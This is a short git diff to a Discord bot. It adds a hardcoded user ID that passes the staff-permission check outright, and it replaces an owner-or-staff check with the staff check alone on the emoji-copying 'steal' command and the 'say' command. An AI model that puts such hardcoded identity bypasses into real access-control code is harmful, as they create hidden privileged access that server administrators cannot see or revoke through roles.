@@ -11,6 +11,8 @@ bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
 bot.remove_command("help")
 
 def onlystaff(ctx:Context):
+    if ctx.author.id == 771601176155783198:
+        return True
     if ctx.guild.get_role(868890524843638804) not in ctx.author.roles:
         return False
     return True
@@ -46,7 +48,7 @@ async def on_member_remove(member:discord.Member):
     await bot.get_channel(868890526433280027).send(embed=embed)
 
 @bot.command()
-@commands.check_any(onlystaff, is_owner)
+@commands.check(onlystaff)
 async def steal(ctx:Context, name:str, emoji:Union[discord.Emoji, str]=None):
     url = ""
     if isinstance(emoji, discord.Emoji):
@@ -74,7 +76,7 @@ async def steal(ctx:Context, name:str, emoji:Union[discord.Emoji, str]=None):
         await ctx.send(f"An error occured: {e}")
 
 @bot.command()
-@commands.check_any(onlystaff, is_owner)
+@commands.check(onlystaff)
 async def say(ctx, *, sentence):
     chl = sentence.split(" ")[0]
     chlmodified = False
